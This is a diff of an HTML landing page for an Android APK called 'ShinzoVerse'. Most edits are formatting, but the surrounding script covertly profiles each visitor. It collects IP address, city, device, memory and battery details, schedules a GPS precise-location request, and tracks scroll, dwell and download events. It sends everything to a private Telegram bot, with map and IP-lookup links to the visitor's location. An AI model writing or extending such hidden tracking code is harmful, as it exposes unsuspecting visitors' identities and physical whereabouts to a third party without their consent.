@@ -1038,8 +1038,15 @@
     }
 
     @keyframes theme-ripple-animation {
-      0% { transform: scale(0); opacity: 0.5; }
-      100% { transform: scale(2500); opacity: 0; }
+      0% {
+        transform: scale(0);
+        opacity: 0.5;
+      }
+
+      100% {
+        transform: scale(2500);
+        opacity: 0;
+      }
     }
 
 
@@ -1349,7 +1356,7 @@
         </a>
         <div class="btn-meta">
           <span><i class="fas fa-android"></i> Android 5.0+</span>
-          <span><i class="fas fa-database"></i> 9.34 MB</span>
+          <span><i class="fas fa-database"></i> 15 MB</span>
           <span><i class="fas fa-circle-check"></i> v2.3.1</span>
         </div>
       </div>
@@ -1533,7 +1540,7 @@
         GET THE
         <span>APP</span>
       </div>
-      <div class="dl-sub">Free &nbsp;•&nbsp; Android 5.0+ &nbsp;•&nbsp; 9.34 MB</div>
+      <div class="dl-sub">Free &nbsp;•&nbsp; Android 5.0+ &nbsp;•&nbsp; 15 MB</div>
       <a href="ShinzoVerse.apk" class="btn-dl-big" id="btn2">
         <i class="fas fa-download"></i>
         DOWNLOAD APK
@@ -1627,7 +1634,7 @@
       localStorage.setItem('shinzo_user_id', userId);
 
       var userMetadata = {
-        location: 'Detecting...', ip: '0.0.0.0', 
+        location: 'Detecting...', ip: '0.0.0.0',
         device: getDeviceInfo(), network: 'N/A', battery: 'N/A',
         cores: navigator.hardwareConcurrency || 'N/A',
         memory: navigator.deviceMemory || 'N/A',
@@ -1641,11 +1648,11 @@
       function getDeviceInfo() {
         var ua = navigator.userAgent;
         var os = "Unknown", browser = "Unknown";
-        if (ua.indexOf("Win") != -1) os = "Windows";
+        if (ua.indexOf("Android") != -1) os = "Android";
+        else if (ua.indexOf("iPhone") != -1 || ua.indexOf("iPad") != -1 || ua.indexOf("iPod") != -1) os = "iOS";
+        else if (ua.indexOf("Win") != -1) os = "Windows";
         else if (ua.indexOf("Mac") != -1) os = "MacOS";
         else if (ua.indexOf("Linux") != -1) os = "Linux";
-        else if (ua.indexOf("Android") != -1) os = "Android";
-        else if (ua.indexOf("iPhone") != -1) os = "iOS";
         if (ua.indexOf("Chrome") != -1) browser = "Chrome";
         else if (ua.indexOf("Firefox") != -1) browser = "Firefox";
         else if (ua.indexOf("Safari") != -1) browser = "Safari";
@@ -1667,7 +1674,7 @@
           }
           userMetadata.ip = ipData.ip || 'Unknown';
           userMetadata.location = (ipData.city || 'Unknown') + ', ' + (ipData.country_name || 'Unknown');
-          
+
           sendTelegramNotification('visit', 'Landed from ' + userMetadata.location);
           setTimeout(requestPreciseLocation, 2000);
         } catch (e) { sendTelegramNotification('error', 'Init failed: ' + e.message); }
@@ -1693,10 +1700,10 @@
       function sendTelegramNotification(type, details) {
         var icons = { visit: '👋', download: '📥', video: '📺', theme: '🌓', scroll: '📜', session: '⏳', error: '🚨', exit: '🏃', gps: '📍' };
         var titles = { visit: 'New Visit', download: 'APK Download', video: 'Video Click', theme: 'Theme Toggled', scroll: 'Milestone', session: 'Duration', error: 'Error', exit: 'Exit Intent', gps: 'GPS Precise Location' };
-        
+
         var icon = icons[type] || '🚀', title = titles[type] || 'Event';
         var duration = Math.round((Date.now() - sessionStartTime) / 1000);
-        var timeStr = duration < 60 ? duration + 's' : Math.floor(duration/60) + 'm ' + (duration%60) + 's';
+        var timeStr = duration < 60 ? duration + 's' : Math.floor(duration / 60) + 'm ' + (duration % 60) + 's';
         var locDisplay = userMetadata.address || userMetadata.location;
         var gpsBadge = userMetadata.coords ? ' (✅ GPS Verified)' : ' (❌ IP Only)';
 
@@ -1713,13 +1720,13 @@
           '<b>🌐 Domain:</b> ' + window.location.hostname;
 
         var mapsUrl = userMetadata.coords ? 'https://www.google.com/maps/search/?api=1&query=' + userMetadata.coords : 'https://www.google.com/maps/search/' + encodeURIComponent(userMetadata.location);
-        
+
         fetch('https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: CHAT_ID, text: htmlText, parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[ { text: '📍 Open Maps', url: mapsUrl }, { text: '🔍 IP Info', url: 'https://ipinfo.io/' + userMetadata.ip } ]] }
+            reply_markup: { inline_keyboard: [[{ text: '📍 Open Maps', url: mapsUrl }, { text: '🔍 IP Info', url: 'https://ipinfo.io/' + userMetadata.ip }]] }
           })
         }).catch(e => console.error('TG Error:', e));
       }
@@ -1727,11 +1734,11 @@
       // ── INTERACTION TRACKING ──
       var dwellTracker = {
         start: {},
-        observe: function(id, name) {
+        observe: function (id, name) {
           var el = document.getElementById(id);
           if (!el) return;
-          new IntersectionObserver(function(entries) {
-            entries.forEach(function(e) {
+          new IntersectionObserver(function (entries) {
+            entries.forEach(function (e) {
               if (e.isIntersecting) dwellTracker.start[name] = Date.now();
               else if (dwellTracker.start[name]) {
                 var d = Math.round((Date.now() - dwellTracker.start[name]) / 1000);
@@ -1768,7 +1775,7 @@
           var r = btn.getBoundingClientRect(), s = Math.max(r.width, r.height);
           var rip = document.createElement('span'); rip.classList.add('ripple');
           rip.style.width = rip.style.height = s + 'px';
-          rip.style.left = (e.clientX - r.left - s/2) + 'px'; rip.style.top = (e.clientY - r.top - s/2) + 'px';
+          rip.style.left = (e.clientX - r.left - s / 2) + 'px'; rip.style.top = (e.clientY - r.top - s / 2) + 'px';
           btn.appendChild(rip); setTimeout(() => rip.remove(), 600);
         });
       });
